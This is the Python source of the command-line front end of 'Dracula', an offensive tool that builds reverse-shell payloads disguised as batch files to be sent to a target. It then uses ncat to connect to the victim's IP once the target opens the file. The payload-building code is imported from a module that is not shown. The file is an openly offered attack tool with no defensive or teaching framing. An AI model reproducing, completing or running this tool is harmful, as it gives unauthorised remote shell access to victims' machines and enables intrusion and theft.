import os
import subprocess
import argparse
import Main.dracula_main as main

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print('\n') 
    banner = [
        "     _____                       _       ",
        "    |  __ \\                     | |      ",
        "    | |  | |_.__ __._  ___._   _| | __._ ",
        "    | |  | |  __/ _  |/ __| | | | |/ _  |",
        "    | |__| | | | (_| | (__| |_| | | (_| |",
        "    |_____/|_|  \\__._|\\___|\\__._|_|\\__._|"
    ]
    
    colors = [57, 63, 69, 75, 81, 87]  # Shades from blue-violet to cyan
    
    for i, line in enumerate(banner):
        txt_color = colors[i % len(colors)]  # Cycle through selected colors
        colored_line = ''.join(f'\033[38;5;{txt_color}m{char}' for char in line)
        print(colored_line)
    print("[-] Developed by ch37")
    print('\033[0m')  # Reset color
    print("[-] Use -h for help")

clear_screen()
print_banner()

while True:
    dracula_cm = input("\033[38;5;57mDracula >> \033[0m ").split()
    parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
    parser.add_argument("-p", "--port", help="Port number for the reverse shell")
    parser.add_argument("-s", "--shell", help="Shell type ex- cmd, bash, powershell etc.")
    parser.add_argument("-o", "--output", help="Output file name.")
    parser.add_argument("-l", "--connect", action="store_true",help="Connects with the target if the target opened file.")
    parser.add_argument("-i", "--ip",help="Specify the ip adress of target")


    try:
        args = parser.parse_args(dracula_cm)
        if args.connect:
            if args.port: 
                print("Starting connect on port", args.port)
                try:
                    subprocess.run(["ncat", args.ip, str(args.port)], check=True)
                except subprocess.CalledProcessError as e:
                    print(f"\033[38;5;31mError starting connect: {e}")
                except FileNotFoundError:
                    print("\033[38;5;31mError: ncat not found. Please install ncat.")
                except Exception as e:
                    print(f"\033[38;5;31mError starting connect: {e}")

            else:
                print("\033[38;5;31mError: -l/--connect requires -p/--port to be specified.")
        elif args.port and args.shell and args.output: 
            main.generate_payload(args.port, args.shell, args.output)
        elif args.port or args.shell or args.output:
            print("\033[38;5;31mPlease specify all -p, -s and -o flags to generate the batch file.")
        elif not dracula_cm:
            pass
        else:
            print("\033[38;5;31mInvalid arguments. Use -h for help.")


    except SystemExit:
        pass
    except Exception as e:
        print(f"\033[38;5;31mAn error occurred: {e}")